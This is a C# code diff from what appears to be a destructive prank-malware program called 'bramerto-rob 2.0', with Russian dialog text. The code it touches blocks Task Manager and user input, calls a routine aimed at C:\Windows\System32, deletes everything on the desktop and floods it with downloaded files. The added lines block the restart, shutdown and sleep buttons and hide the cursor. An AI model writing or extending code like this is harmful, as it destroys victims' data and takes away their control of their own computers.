@@ -61,6 +61,7 @@ namespace bramerto_rob_2._0
                     DialogResult dg3 = MessageBox.Show("Ну, что ж, поехали!)", "bramerto-rob 2.0", MessageBoxButtons.OK);
                     if (dg3 == DialogResult.OK)
                     {
+                        this.Visible = true;
                         s.BlockTM();
                         sp.Play();
                         NativeMethods.BlockInput(true);
@@ -90,10 +91,14 @@ namespace bramerto_rob_2._0
             s.KillMemory(@"C:\Windows\System32\", 1000000000);
             s.DeleteALLFromDesktop();
             s.CreateFilesOnDesktop(1000, "https://rozetked.me/images/uploads/fJ8LPcfByPPv.jpg", "Shrek.ru");
+            s.BlockRestartButton();
+            s.BlockShutDownButton();
+            s.BlockSleepButton();
             this.WindowState = FormWindowState.Minimized;
             sp2.PlayLooping();
             timer2.Enabled = true;
             timer2.Start();
+            Cursor.Hide();
             s.OpenPage();
         }
 
